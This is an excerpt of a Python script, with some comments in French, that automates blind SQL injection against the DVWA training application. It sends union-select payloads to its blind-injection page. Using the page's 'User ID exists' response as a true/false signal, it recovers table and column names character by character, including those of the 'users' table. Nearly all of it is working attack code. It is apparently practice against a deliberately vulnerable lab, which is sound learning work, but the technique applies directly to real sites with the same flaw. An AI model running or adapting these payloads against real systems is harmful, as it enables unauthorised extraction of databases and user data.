...
def blink(cookies):
    ...
    url = dvwa + "/vulnerabilities/sqli_blind/"
    ...
    # La longueur des tables
    for l in range(1,20):
        data = {
                "id" : "0' union SELECT 1, 2 FROM information_schema.tables WHERE table_schema=0x64767761 and length(TABLE_NAME)={} limit 1 -- -",
                "Submit": "Submit",
            }

        data['id'] = data['id'].format(l)
        # print(data)
        if (test(cookies, data)):
            print(l)
            # break
    ...
    for i in range(1,6):
        for y in string.printable:
            data = {
                    "id" : "0' union SELECT 1, 2 FROM information_schema.tables WHERE table_schema=0x64767761 and length(TABLE_NAME)=5 and substring(TABLE_NAME,1,{})=0x{} limit 1 -- -",
                    "Submit": "Submit",
                }

            l =  binascii.hexlify((name+y).encode('utf-8'))
            

        
            # print("Here")
            
            data['id'] = data['id'].format(i, l.decode('utf-8'))
            if (test(cookies, data)):
                name = name + y
                print (name)
    ...
    for i in range(1,10):
        for y in string.printable:
            data = {
                    "id" : "0' union SELECT 1, 2 FROM information_schema.tables WHERE table_schema=0x64767761 and length(TABLE_NAME)=9 and substring(TABLE_NAME,1,{})=0x{} limit 1 -- -",
                    "Submit": "Submit",
                }
    ...
    for l in range(1,20):
        data = {
            "id" : "0' union  SELECT 1,2 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x64767761 AND TABLE_NAME =0x7573657273  and length(COLUMN_NAME)={} -- -",
            "Submit": "Submit",
        }
    ...
    for y in string.printable:
        data = {
                "id" : "0' union SELECT 1, 2 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x64767761 AND TABLE_NAME =0x7573657273 and substring(COLUMN_NAME,1,1)=0x{} limit 1 -- -",
                "Submit": "Submit",
            }
    ...
    for j in range(100):
        ...
        r = requests.get(url_redirect, cookies=cookies)
        soup = BeautifulSoup(r.text,features="lxml")
        # print(soup)
...
def test(cookies, data):
    ...
    for p in soup("pre"):
        ...
        if(len(p.findAll(text="User ID exists in the database."))==1):
            # print ("++ True")
            return True
